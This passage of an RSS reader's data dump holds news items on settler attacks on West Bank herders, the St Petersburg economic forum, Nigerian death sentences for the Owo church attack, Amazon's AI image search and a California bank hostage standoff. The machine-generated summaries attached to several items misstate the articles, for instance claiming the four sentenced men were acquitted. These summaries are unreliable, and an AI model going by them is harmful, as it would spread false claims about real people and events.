Area C.</p><p>More than 90 percent of the area between Masafer Yatta and the Jordan Valley in the east is off-limits to Palestinian farmers and shepherds. Israeli settlers’ flocks, meanwhile, have unrestricted access to the grazing lands, he said.</p><p>This campaign of settler violence and Israeli restrictions on Palestinian farmers has led to a decline in the number of livestock in the West Bank and Gaza, 1.75 million head four years ago to only 480,000 today, Melhem said.</p><p>Combined with settlers’ targeting of olive groves during harvest season, the main West Bank crop, it will be the complete destruction of a way of life that has survived for centuries in Palestine.</p><p>“I am not exaggerating when I say that if the situation continues as it is, without support for livestock breeders, then Palestinians will be forced to buy sacrificial animals from settlers who are fully protected by the Israeli army,” Melhem told Al Jazeera.</p><p>“We are on the brink of collapse in food security in both the plant and animal sectors if there is no international intervention to protect [us].”</p></div></div>`,content_text:`Mukhlis Masa’id of Khirbet Yarza in the occupied West Bank has lived in a state of sorrow since settlers intensified their attacks on his Jordan Valley community three years ago.He and other local Palestinians have seen settlers destroy their crops, attack their homes, and assault shepherds and farmers working the grazing lands around the village, with growing ferocity and incidence.Fourteen families, about 100 Palestinians in total, called this region home until increasing violent settler activity forced them to consider their future here. Early this year, locals decided they had had enough with the near-daily settler attacks, so they gathered their surviving livestock and left the village.This sustained targeting of agriculture in the area – on which almost the entire community relies – appears to be part of an organised and systematic campaign of intimidation by settlers, intended to drive whole Palestinian farming communities from their land.“The settlers have many means of communication among themselves. When they attack the shepherds, dozens of them gather to intimidate them. Meanwhile, we have no means of transportation to reach the shepherds and try to protect them. Our roads are also rough and unpaved, unlike the roads used by the settlers,” Masa’id told Al Jazeera.The settlers didn’t stop there; they stole hundreds of sheep and cattle, the lifeblood of this northern West Bank community.“We feel like we’ve lost a son. What happened to us is the worst thing that could ever happen – to leave the homes we’ve lived in all our lives, homes we hoped our children and grandchildren would live in too,” he told us.The settler attacks intensified from October 2023, months after a new Israeli government came to power with far-right ministers – who led or are part of settler movements – appointed to key posts. The campaign continued until the community had fled their homes in March 2026, but even then, their troubles did not end.“Dozens of sheep died from diseases after we moved. When we left, we had to leave the fodder in the rain because there was nowhere else to store it, and it spoiled,” Masa’id said.“Now, we graze the remaining livestock in cramped, overcrowded areas like the countryside around Tubas. Nothing we’re living now resembles our life in Yirza.”Bedouin people who were forced to leave their lands under the settlers’ attacks [Courtesy of Mohamad Ateeq]The pattern of repeated attacks by settlers doesn’t only target Area C, the part of the occupied West Bank fully under Israeli control and which makes up more than 60 percent of the West Bank.There appear to be broader objectives related to the entire Palestinian territory, which has been under Israeli occupation since 1967. This includes Area A, a zone technically under full Palestinian Authority control but witnessing increasing settler activity.Zuhair Abu Shaar, from Jifna, north of Ramallah, was shocked to see a group of Israeli settlers unexpectedly storm his livestock pen, in the heart of the village, on April 15.The villagers confronted the band, who briefly left the area, but they returned half an hour later with 12 Israeli military vehicles in support.“The soldiers got out of the vehicles on foot and came to us with the settlers. They stole 180 head of cattle, took them away, assaulted us, and shot one of my neighbours in the leg,” Abu Shaar told Al Jazeera.“They also struck my nephew hard in the side, in the area of a surgery he had months ago, causing him to fall to the ground. When I tried to defend him, they beat me, handcuffed me, threw me to the ground, and pointed a gun at my head.”The army emptied the entire pen except for one sick sheep that couldn’t walk and withdrew behind a cloud of tear gas, with a donkey and a car they found in the village in tow.Zuhair estimates his losses at no less than 450,000 shekels ($150,000) and has no information on the livestock, his sole source of income, that were stolen by the settler party.“I’m like someone whose house is demolished and is rebuilding it brick by brick. I’m trying to start from scratch. This is an occupation, and we expect anything from them as they try to force us out of our land,” he added.Zuhair Abu Sha’ar has seen his livestock stolen by Israeli settlers [Courtesy of Mohamad Turkman]Nidal Younis, head of the Masafer Yatta village council, south of Hebron, told Al Jazeera that over the past three years, almost all the grazing lands in the area have been seized by settlers.Settler groups have established 12 new outposts around Masafer Yatta, in addition to appropriating more than 90 percent of land cultivated with winter crops, such as wheat and barley, according to officials in the area.“Last year, settlers prevented people from harvesting their crops while simultaneously bringing their sheep to graze on them,” said Younis. “They also prevented farmers from ploughing their land by attacking tractors and assaulting the farmers.”On January 27, settlers attacked a village in the Masafer Yatta area and stole 300 head of livestock. Even those grazing sheep on land outside the area were attacked, had their livestock stolen, or were beaten.“The cost of livestock has become very high for people, and many families have sold part of their herds to be able to feed the rest,” he said.“There is a sharp annual decline in livestock in Masafer Yatta, and what remains is less than 25 percent of what it was several years ago.”According to a report issued by the United Nations Office for the Coordination of Humanitarian Affairs (OCHA) in mid-May 2026, the Jordan Valley has seen the number of monthly incidents resulting in injuries or property damage rise from two per month in 2020 to 27 in the first four months of 2026.These cases are no longer limited to individual attacks on Palestinians, but have targeted the whole way of life for these agricultural communities after sustained attacks on pastures, water sources and reservoirs. Agricultural equipment and facilities, such as animal pens, have also been destroyed.The OCHA warned that the repeated targeting of Palestinian agriculture threatens to undermine families’ ability to maintain their livelihoods, due to many residents depending on herding as their primary source of income. A 2025 report published by the Food and Agriculture Organization of the United Nations (FAO) showed that nearly two-thirds of the 72,000 farming and herding families in the occupied West Bank required emergency assistance.Abbas Melhem, head of the Union of Palestinian Agricultural Associations, told us that 87 percent of the livestock sector is concentrated in an area stretching from Masafer Yatta to the Jordan Valley in the east, most of which is in Area C.More than 90 percent of the area between Masafer Yatta and the Jordan Valley in the east is off-limits to Palestinian farmers and shepherds. Israeli settlers’ flocks, meanwhile, have unrestricted access to the grazing lands, he said.This campaign of settler violence and Israeli restrictions on Palestinian farmers has led to a decline in the number of livestock in the West Bank and Gaza, 1.75 million head four years ago to only 480,000 today, Melhem said.Combined with settlers’ targeting of olive groves during harvest season, the main West Bank crop, it will be the complete destruction of a way of life that has survived for centuries in Palestine.“I am not exaggerating when I say that if the situation continues as it is, without support for livestock breeders, then Palestinians will be forced to buy sacrificial animals from settlers who are fully protected by the Israeli army,” Melhem told Al Jazeera.“We are on the brink of collapse in food security in both the plant and animal sectors if there is no international intervention to protect [us].”`,summary:`• The article discusses a disturbing pattern of settler violence and land confiscation within the occupied West Bank. According to Zuhair Abu Shaar, head of the Masafer Yatta village council, settlers have targeted grazing lands in Area C and throughout the Palestinian territory, including areas like Yirza. He mentions attacks on shepherds, livestock, and crops, with no means for them to protect themselves or their families. Many communities are forced to flee their homes, leaving little to live by despite their hard-earned struggles. The article highlights ongoing threats against Palestinians in the occupied territories due to Israeli policy of limiting Palestinian agriculture and grazing areas.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/original-E022BAAD-9F9E-44C0-8800-6CB17FD2A7C1-1-1780414557.jpg?resize=1200%2C630`,published_at:1780504795,fetched_at:1780509343,content_hash:`e3041bcd6065a734a162fd26fd9cae24ec70d7c5cda6ab1d4b541e5a75d26e6c`,tags:`Features`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:79,feed_id:11,guid:`https://www.aljazeera.com/?t=1780488903`,url:`https://www.aljazeera.com/news/2026/6/3/what-is-the-st-petersburg-forum-putins-economic-outreach-to-the-world?traffic_source=rss`,title:`What is the St Petersburg forum, Putin’s economic outreach to the world?`,content_html:`<div id="readability-page-1" class="page"><div aria-live="polite" aria-atomic="true"><p>Some 20,000 guests from more than 130 countries are expected to attend the three-day <a href="https://www.aljazeera.com/video/newsfeed/2026/6/2/russia-launches-massive-overnight-attack-on-ukraine">St Petersburg International Economic Forum (SPIEF)</a>, an annual gathering often described as the “Russian Davos”.</p><p>This year’s event begins on Wednesday against the backdrop of the war in Ukraine and Russia’s prolonged estrangement from much of the West. Hours before delegates arrived in the city, Ukrainian drones struck energy facilities in and around St Petersburg, according to Russian and Ukrainian authorities. The attacks, which took place roughly 16km (10 miles) from the forum venue, temporarily disrupted operations at the city’s airport, though the conference is proceeding as planned.</p><section><h2>Recommended Stories </h2><span>list of 4 items</span><ul><li><span>list 1 of 4</span><a href="https://www.aljazeera.com/sports/2026/6/3/morocco-world-cup-2026-preview-players-to-watch-group-and-squad-list">World Cup contenders: Are Morocco ready to go all the way this time?</a></li><li><span>list 2 of 4</span><a href="https://www.aljazeera.com/news/2026/6/3/iran-kuwait-bahrain-hit-is-the-war-in-the-gulf-escalating-again">Iran, Kuwait, Bahrain hit: Is the war in the Gulf escalating again?</a></li><li><span>list 3 of 4</span><a href="https://www.aljazeera.com/news/2026/6/3/israel-is-building-more-military-posts-in-gaza-satellite-imagery-shows">Israel is building more military posts in Gaza, satellite imagery shows</a></li><li><span>list 4 of 4</span><a href="https://www.aljazeera.com/sports/2026/6/3/ferrari-sign-leclerc-on-new-long-term-contract-ahead-of-home-f1-monaco-gp">Leclerc staying with Ferrari for years to come</a></li></ul><span>end of list</span></section><p>The SPIEF has become far more than an economic conference for Moscow. As Western governments and many multinational companies have distanced themselves from Russia since the invasion of Ukraine in 2022, the forum has emerged as a showcase for the Kremlin’s efforts to deepen ties with countries in the Global South.</p><p>Attendance has remained strong despite Russia’s diplomatic isolation in Europe and North America, with officials portraying the gathering as evidence that Moscow retains international partners beyond the West. Here’s a closer look at the event.</p><h2 id="what-is-the-st-petersburg-international-economic-forum">What is the St Petersburg International Economic Forum?</h2><p>The first SPIEF was held in June 1997, during a period when post-Soviet Russia was seeking foreign investment and closer integration with the global economy. The annual forum was designed to attract investors and project an image of a country open for business after the collapse of the Soviet Union.</p><p>Over nearly three decades, it has evolved into one of Russia’s most prominent international events. While investment and business remain central themes, the forum has increasingly become a platform for Moscow to present its vision of the global order and cultivate political ties abroad.</p><p>The programme combines investment discussions and political debates. This year’s sessions range from energy markets and artificial intelligence to information warfare and media influence. One panel, featuring Russian Foreign Ministry spokesperson Maria Zakharova, is titled: “Your Words are Like Bullets: How Information Has Transformed into the Most Powerful Weapon of the Modern Era.”</p><h2 id="who-is-attending">Who is attending?</h2><p>One notable development this year is the presence of an official US delegation, the first such participation at a major Russian investment forum since before the Ukraine war. President Donald Trump has appointed Rodney Mims Cook Jr, chairman of the US Commission of Fine Arts, as his representative at the event.</p><p>Cook is expected to participate in a session titled “Russia-USA: A Cultural Dialogue”. The American Chamber of Commerce in Russia and the Roscongress Foundation are also organising a business forum focused on potential cooperation between Russian and US companies.</p><p>Others expected to attend include Uzbekistan President Shavkat Mirziyoyev, Tanzania’s President Samia Suluhu Hassan, and China’s Vice President Han Zheng, Kremlin foreign policy aide Yury Ushakov told media on Tuesday. Han is expected to meet with Putin separately on June 6.</p><p>SPIEF’s guest country this year is Saudi Arabia, which is sending Energy Minister Prince Abdulaziz bin Salman Al Saud, said Ushakov.</p><p>The event also attracts a mixture of former world leaders and controversial media personalities, with attendees including former German Chancellor Gerhard Schroder, actor and longtime Putin supporter Steven Seagal, conservative US commentator Candace Owens, and far-right social media personalities Andrew and Tristan Tate, both of whom are the subject of allegations of trafficking, rape and organised crime in Romania, as well as a number of allegations in the UK.</p><p>German retail billionaire Thomas Bruch, owner of Hyperglobus, is expected to participate in discussions on German investment in Russia. Forum organisers say approximately 1,800 German companies continue to operate in the country despite the deterioration in relations between Moscow and Berlin.</p><p>The Kremlin has also invited leaders and ministers from countries with which it has maintained close ties, including the presidents of Uzbekistan and Tanzania, alongside officials from Belarus, Cuba and Saudi Arabia.</p><h2 id="why-does-the-forum-matter">Why does the forum matter?</h2><p>The SPIEF is one of the most closely monitored events on Russia’s political calendar, with\xA0President Vladimir Putin almost always attending and delivering the forum’s keynote address, often using the occasion to outline Russia’s economic priorities, but also its stance on regional developments, offering a glimpse into its foreign policy ambitions.</p><p>The session typically includes an extended question-and-answer segment, which has been known to grab headlines. In 2022, months after launching Russia’s full-scale invasion of Ukraine, Putin used SPIEF to denounce Western sanctions and argue that efforts to isolate Russia had failed.</p><p>Beyond the headlines, the forum serves a broader economic purpose for Moscow, as well. Western sanctions and the loss of many European markets have forced Russia to redirect trade and investment towards new partners across Asia, Africa and South America.</p><p>By attracting foreign officials, executives and investors to Russia, Moscow also seeks to demonstrate that it remains integrated into parts of the global economy and is not wholly dependent on the West’s political approval.</p></div></div>`,content_text:`Some 20,000 guests from more than 130 countries are expected to attend the three-day St Petersburg International Economic Forum (SPIEF), an annual gathering often described as the “Russian Davos”.This year’s event begins on Wednesday against the backdrop of the war in Ukraine and Russia’s prolonged estrangement from much of the West. Hours before delegates arrived in the city, Ukrainian drones struck energy facilities in and around St Petersburg, according to Russian and Ukrainian authorities. The attacks, which took place roughly 16km (10 miles) from the forum venue, temporarily disrupted operations at the city’s airport, though the conference is proceeding as planned.Recommended Stories list of 4 itemslist 1 of 4World Cup contenders: Are Morocco ready to go all the way this time?list 2 of 4Iran, Kuwait, Bahrain hit: Is the war in the Gulf escalating again?list 3 of 4Israel is building more military posts in Gaza, satellite imagery showslist 4 of 4Leclerc staying with Ferrari for years to comeend of listThe SPIEF has become far more than an economic conference for Moscow. As Western governments and many multinational companies have distanced themselves from Russia since the invasion of Ukraine in 2022, the forum has emerged as a showcase for the Kremlin’s efforts to deepen ties with countries in the Global South.Attendance has remained strong despite Russia’s diplomatic isolation in Europe and North America, with officials portraying the gathering as evidence that Moscow retains international partners beyond the West. Here’s a closer look at the event.What is the St Petersburg International Economic Forum?The first SPIEF was held in June 1997, during a period when post-Soviet Russia was seeking foreign investment and closer integration with the global economy. The annual forum was designed to attract investors and project an image of a country open for business after the collapse of the Soviet Union.Over nearly three decades, it has evolved into one of Russia’s most prominent international events. While investment and business remain central themes, the forum has increasingly become a platform for Moscow to present its vision of the global order and cultivate political ties abroad.The programme combines investment discussions and political debates. This year’s sessions range from energy markets and artificial intelligence to information warfare and media influence. One panel, featuring Russian Foreign Ministry spokesperson Maria Zakharova, is titled: “Your Words are Like Bullets: How Information Has Transformed into the Most Powerful Weapon of the Modern Era.”Who is attending?One notable development this year is the presence of an official US delegation, the first such participation at a major Russian investment forum since before the Ukraine war. President Donald Trump has appointed Rodney Mims Cook Jr, chairman of the US Commission of Fine Arts, as his representative at the event.Cook is expected to participate in a session titled “Russia-USA: A Cultural Dialogue”. The American Chamber of Commerce in Russia and the Roscongress Foundation are also organising a business forum focused on potential cooperation between Russian and US companies.Others expected to attend include Uzbekistan President Shavkat Mirziyoyev, Tanzania’s President Samia Suluhu Hassan, and China’s Vice President Han Zheng, Kremlin foreign policy aide Yury Ushakov told media on Tuesday. Han is expected to meet with Putin separately on June 6.SPIEF’s guest country this year is Saudi Arabia, which is sending Energy Minister Prince Abdulaziz bin Salman Al Saud, said Ushakov.The event also attracts a mixture of former world leaders and controversial media personalities, with attendees including former German Chancellor Gerhard Schroder, actor and longtime Putin supporter Steven Seagal, conservative US commentator Candace Owens, and far-right social media personalities Andrew and Tristan Tate, both of whom are the subject of allegations of trafficking, rape and organised crime in Romania, as well as a number of allegations in the UK.German retail billionaire Thomas Bruch, owner of Hyperglobus, is expected to participate in discussions on German investment in Russia. Forum organisers say approximately 1,800 German companies continue to operate in the country despite the deterioration in relations between Moscow and Berlin.The Kremlin has also invited leaders and ministers from countries with which it has maintained close ties, including the presidents of Uzbekistan and Tanzania, alongside officials from Belarus, Cuba and Saudi Arabia.Why does the forum matter?The SPIEF is one of the most closely monitored events on Russia’s political calendar, with\xA0President Vladimir Putin almost always attending and delivering the forum’s keynote address, often using the occasion to outline Russia’s economic priorities, but also its stance on regional developments, offering a glimpse into its foreign policy ambitions.The session typically includes an extended question-and-answer segment, which has been known to grab headlines. In 2022, months after launching Russia’s full-scale invasion of Ukraine, Putin used SPIEF to denounce Western sanctions and argue that efforts to isolate Russia had failed.Beyond the headlines, the forum serves a broader economic purpose for Moscow, as well. Western sanctions and the loss of many European markets have forced Russia to redirect trade and investment towards new partners across Asia, Africa and South America.By attracting foreign officials, executives and investors to Russia, Moscow also seeks to demonstrate that it remains integrated into parts of the global economy and is not wholly dependent on the West’s political approval.`,summary:`• The St Petersburg International Economic Forum (SPIEF) is a high-profile annual gathering in the Russian capital where major business leaders from around the world discuss economic trends, policy proposals, and investment opportunities. In 2023, it's expected to attract up to 18,000 guests from more than 130 countries. The forum has become an important platform for Russia to present its economic outlook and foster political ties with Western powers, including the United States.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2023/06/2023-06-16T144622Z_1224955203_RC2EK1ADAQU5_RTRMADP_3_RUSSIA-FORUM-PUTIN-1686930260.jpg?resize=1920%2C1440`,published_at:1780503632,fetched_at:1780509344,content_hash:`d29a66385b0f19c4576d83633202ae96559e08fee9c1899902512fc77580628e`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:73,feed_id:9,guid:`https://www.bbc.com/news/articles/cj0p57q1m36o#1`,url:`https://www.bbc.com/news/articles/cj0p57q1m36o?at_medium=RSS&at_campaign=rss`,title:`Four sentenced to death for killing worshippers at Catholic church in Nigeria`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-component="headline-block"><p><h2>Four sentenced to death for killing worshippers at Catholic church in Nigeria</h2></p></div><div data-testid="byline" data-component="byline-block"><p><time datetime="2026-06-03T16:12:05.319Z">2 hours ago</time></p><p><span data-testid="byline-contributors"><div data-testid="byline-contributors-contributor-0"><p><span>Chukwunaeme Obiejesi</span><span data-testid="byline-contributors-contributor-0-role-location">BBC Africa, Abuja</span></p></div></span></p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/8618/live/298a8260-5f58-11f1-b658-099eb92ce9d6.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/8618/live/298a8260-5f58-11f1-b658-099eb92ce9d6.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/8618/live/298a8260-5f58-11f1-b658-099eb92ce9d6.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/8618/live/298a8260-5f58-11f1-b658-099eb92ce9d6.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/8618/live/298a8260-5f58-11f1-b658-099eb92ce9d6.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/8618/live/298a8260-5f58-11f1-b658-099eb92ce9d6.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/8618/live/298a8260-5f58-11f1-b658-099eb92ce9d6.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/8618/live/298a8260-5f58-11f1-b658-099eb92ce9d6.jpg.webp" loading="eager" alt="Reuters The five men sitting on red and black chairs in court"/><span>Reuters</span></p></div><p><figcaption>Five men were on trial but only four were sentenced after one was acquitted</figcaption></p></figure></div><div data-component="text-block"><p>A court in Nigeria has sentenced four men to death for attacking a church in the south-western Ondo state in 2022 in a case which sent shockwaves across the nation.</p></div><div data-component="text-block"><p>The court in the capital Abuja also sentenced the men - Idris Abdulmalik Omeiza, Al Qasim Idris, Jamiu Abdulmalik and Abdulhaleem Idris - to 20 years in prison for belonging to a terrorist group.</p></div><div data-component="text-block"><p>Presidential assent is required before any death sentence is carried out in Nigeria. There have not been any executions in the country for several years.</p></div><div data-component="text-block"><p>Judge Emeka Nwite, who presided over the case, said the evidence presented against them was &#34;neither shaken nor contradicted during cross examination&#34;.</p></div><div data-component="text-block"><p>He had ordered an accelerated hearing after the high-profile trial commenced in August 2025.</p></div><div data-component="text-block"><p>In his judgement, Justice Nwite said that the prosecution had proved their case beyond reasonable doubt as they had brought before the court witnesses who saw the attack, including one who testified to recognising two of the defendants as attackers.</p></div><div data-component="text-block"><p>&#34;Hence this court finds the first to fourth defendants guilty of all nine counts,&#34; he added. </p></div><div data-component="text-block"><p>One of the witnesses the court heard from was a woman who had her legs amputated from the knees, and had lost her left eye as a result of a dynamite explosion which the attackers had detonated.</p></div><div data-component="text-block"><p>The nine counts included joining a terror group, and planning and carrying out killings.</p></div><div data-component="text-block"><p>Prosecutor Ayodeji Adedipe said: &#34;Justice has been served, justice has been done to the deceased who were murdered in cold blood.&#34;</p></div><div data-component="text-block"><p>The men&#39;s defence lawyer said they would appeal against the sentence.</p></div><div data-component="text-block"><p>During the trial, the defendants said they had been  tortured, including being hung from the ceiling, beaten countless times, and using electric shocks on their genitals.</p></div><div data-component="text-block"><p>A fifth defendant, Momoh Otuho Abubakar, was discharged and acquitted by the court due to insufficient evidence against him.</p></div><div data-component="text-block"><p>He was accused of having financed the attack, by allegedly receiving 800,000 naira (£440; $590) twice from another suspect - who is still at large - and then disbursing the funds to the attackers.</p></div><div data-component="text-block"><p>During cross examination, however, Abubakar said the money in his account was the proceeds of his farming business, as well as activities from his cooperative society. He denied that the four other defendants were beneficiaries of the money.</p></div><div data-component="text-block"><p>Since the Owo attack, Nigeria has witnessed many more attacks on churches across the country as it continues to grapple with rising insecurity.</p></div><div data-component="text-block"><p>On Christmas Day, the US hit two camps run by a jihadist group in north-western Nigeria, and threatened more if attacks continued.</p></div><div data-component="text-block"><p>Claims of a genocide against Nigeria&#39;s Christians have been circulating for some time in right-wing US circles, but organisations monitoring political violence in Nigeria say most victims of the jihadist groups are Muslims.</p></div><div data-component="text-block"><p>The Nigerian government also denies that Christians are being persecuted in the country.</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/0a19/live/7c722dc0-089d-11ef-b9d8-4f52aebe147d.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/0a19/live/7c722dc0-089d-11ef-b9d8-4f52aebe147d.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/0a19/live/7c722dc0-089d-11ef-b9d8-4f52aebe147d.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/0a19/live/7c722dc0-089d-11ef-b9d8-4f52aebe147d.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/0a19/live/7c722dc0-089d-11ef-b9d8-4f52aebe147d.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/0a19/live/7c722dc0-089d-11ef-b9d8-4f52aebe147d.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/0a19/live/7c722dc0-089d-11ef-b9d8-4f52aebe147d.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/0a19/live/7c722dc0-089d-11ef-b9d8-4f52aebe147d.jpg.webp" loading="lazy" alt="Getty Images/BBC A woman looking at her mobile phone and the graphic BBC News Africa"/><span>Getty Images/BBC</span></p></div></figure></div></article></div></div>`,content_text:`Four sentenced to death for killing worshippers at Catholic church in Nigeria2 hours agoChukwunaeme ObiejesiBBC Africa, AbujaReutersFive men were on trial but only four were sentenced after one was acquittedA court in Nigeria has sentenced four men to death for attacking a church in the south-western Ondo state in 2022 in a case which sent shockwaves across the nation.The court in the capital Abuja also sentenced the men - Idris Abdulmalik Omeiza, Al Qasim Idris, Jamiu Abdulmalik and Abdulhaleem Idris - to 20 years in prison for belonging to a terrorist group.Presidential assent is required before any death sentence is carried out in Nigeria. There have not been any executions in the country for several years.Judge Emeka Nwite, who presided over the case, said the evidence presented against them was "neither shaken nor contradicted during cross examination".He had ordered an accelerated hearing after the high-profile trial commenced in August 2025.In his judgement, Justice Nwite said that the prosecution had proved their case beyond reasonable doubt as they had brought before the court witnesses who saw the attack, including one who testified to recognising two of the defendants as attackers."Hence this court finds the first to fourth defendants guilty of all nine counts," he added. One of the witnesses the court heard from was a woman who had her legs amputated from the knees, and had lost her left eye as a result of a dynamite explosion which the attackers had detonated.The nine counts included joining a terror group, and planning and carrying out killings.Prosecutor Ayodeji Adedipe said: "Justice has been served, justice has been done to the deceased who were murdered in cold blood."The men's defence lawyer said they would appeal against the sentence.During the trial, the defendants said they had been  tortured, including being hung from the ceiling, beaten countless times, and using electric shocks on their genitals.A fifth defendant, Momoh Otuho Abubakar, was discharged and acquitted by the court due to insufficient evidence against him.He was accused of having financed the attack, by allegedly receiving 800,000 naira (£440; $590) twice from another suspect - who is still at large - and then disbursing the funds to the attackers.During cross examination, however, Abubakar said the money in his account was the proceeds of his farming business, as well as activities from his cooperative society. He denied that the four other defendants were beneficiaries of the money.Since the Owo attack, Nigeria has witnessed many more attacks on churches across the country as it continues to grapple with rising insecurity.On Christmas Day, the US hit two camps run by a jihadist group in north-western Nigeria, and threatened more if attacks continued.Claims of a genocide against Nigeria's Christians have been circulating for some time in right-wing US circles, but organisations monitoring political violence in Nigeria say most victims of the jihadist groups are Muslims.The Nigerian government also denies that Christians are being persecuted in the country.Getty Images/BBC`,summary:`• Four men sentenced to death for attacking a Catholic church in Nigeria were acquitted, while the other three defendants receive 20-year prison sentences. This case highlights the ongoing tension between religious and political boundaries in Nigeria.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/a659/live/120d95f0-5f62-11f1-b682-cf91850925ea.jpg`,published_at:1780503125,fetched_at:1780509343,content_hash:`535ec46b0d6065efb66ddef9956fa556d6fd430bcbf932b2f82fae072fd7e6a2`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:2,feed_id:3,guid:`https://www.theverge.com/?p=942547`,url:`https://www.theverge.com/tech/942547/amazon-search-bar-ai-images`,title:`Amazon&#8217;s search bar will invent AI-generated products you can&#8217;t buy`,author:`Emma Roth`,content_html:`
+
+						
+<figure>
+
+<img alt="An image showing AI-generated Amazon results" data-caption="" data-portal-copyright="Image: Amazon" data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/amazon-ai-search.png?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+		</figcaption>
+</figure>
+<p class="has-text-align-none">Amazon's updated search bar <a href="https://www.aboutamazon.com/news/retail/visual-search-shopping-features">will now show you AI-generated images</a> of products as you describe them. For now, the in-app feature only surfaces AI images of clothing and home goods, allowing you to tap on the image that best matches what you're looking for and search for similar-looking items.</p>
+<p class="has-text-align-none">In a blog post, Amazon positions the feature as a way to help you  search for items if you can't remember the name of a specific texture or style, like describing a "shirt with a draped collar" if you can't think of "cowl neck." The feature seems like it might come in handy in these kinds of scenarios, but it doesn't really add much if you're just searc …</p>
+<p><a href="https://www.theverge.com/tech/942547/amazon-search-bar-ai-images">Read the full story at The Verge.</a></p>
+						`,content_text:`Amazon's updated search bar will now show you AI-generated images of products as you describe them. For now, the in-app feature only surfaces AI images of clothing and home goods, allowing you to tap on the image that best matches what you're looking for and search for similar-looking items. In a blog post, Amazon positions the feature as a way to help you search for items if you can't remember the name of a specific texture or style, like describing a "shirt with a draped collar" if you can't think of "cowl neck." The feature seems like it might come in handy in these kinds of scenarios, but it doesn't really add much if you're just searc … Read the full story at The Verge.`,summary:`• Amazon's search bar will now show AI-generated images of products as you describe them, allowing you to tap on an image that best matches what you're looking for and search for similar-looking items. However, it doesn't really add much if you're just searching for specific things like cowl neck shirts.`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/amazon-ai-search.png?quality=90&strip=all&crop=0,0,100,100`,published_at:1780502851,fetched_at:1780509343,content_hash:`47df55dbcea63f7ef265ce5e528f0efc8c393a70b8e7278dd1404082df7cff44`,tags:`AI, Amazon, Apps`,is_read:!1,is_starred:!0,is_later:!1,dup_count:0},{id:76,feed_id:9,guid:`https://www.bbc.com/news/articles/cn0pdrgy623o#1`,url:`https://www.bbc.com/news/articles/cn0pdrgy623o?at_medium=RSS&at_campaign=rss`,title:`Man shot dead by FBI after taking hostages at California bank`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/78bb/live/3cc98b20-5f5b-11f1-8dad-8347ac6f73d8.jpg.webp" loading="eager" alt="Getty Images Police outside a Chase Bank"/><span>Getty Images</span></p></div></figure></div><div data-component="text-block"><p>A man who had been holding several people hostage overnight inside a California bank has been shot dead in a standoff with the FBI, police said.</p></div><div data-component="text-block"><p>The suspect was killed in &#34;an officer-involved shooting involving Federal Bureau of Investigation personnel&#34; on Wednesday, the Bakersfield Police Department said.</p></div><div data-component="text-block"><p>The fatal shooting ended a tense period after the suspect barricaded himself with several others inside the multistory Chase Bank building on Tuesday in Bakersfield, 110 miles (177km) north of Los Angeles. 